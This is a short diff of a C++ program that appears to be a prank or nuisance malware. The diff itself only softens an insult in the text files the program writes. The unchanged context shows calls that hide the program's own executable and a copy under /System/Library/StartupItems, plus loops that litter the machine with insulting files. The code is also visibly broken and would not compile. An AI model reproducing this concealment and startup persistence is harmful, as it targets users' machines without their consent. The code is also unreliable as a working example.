@@ -41,10 +41,10 @@ int main(int argc, char const *argv[]) {
     }
 
     for (int i = 0; i <= 69; i++) {
-      ifstream newFile (('wanker' + i.c_str() + ".txt").c_str())
+      ifstream newFile (('hahahahahha' + i.c_str() + ".txt").c_str())
 
       if (newFile.is_open()) {
-        newFile << "You is wanker - Fuk off m8" << endl;
+        newFile << "You is idiot - Fuk off m8" << endl;
         newFile.close();
       }
     }
@@ -57,10 +57,10 @@ int main(int argc, char const *argv[]) {
     system(("chflags hidden " + argv[0]).c_str());
     system(("chflags hidden /System/Library/StartupItems/" + argv[0]).c_str());
     for (int x, x <= 69, i++) {
-      ifstream newFile (('wanker' + i.c_str() + ".txt").c_str())
+      ifstream newFile (('hahahahahahhahha' + i.c_str() + ".txt").c_str())
 
       if (newFile.is_open()) {
-        newFile << "You is wanker - Fuk off m8" << endl;
+        newFile << "You is idiot - Fuk off m8" << endl;
         newFile.close();
       }
     }
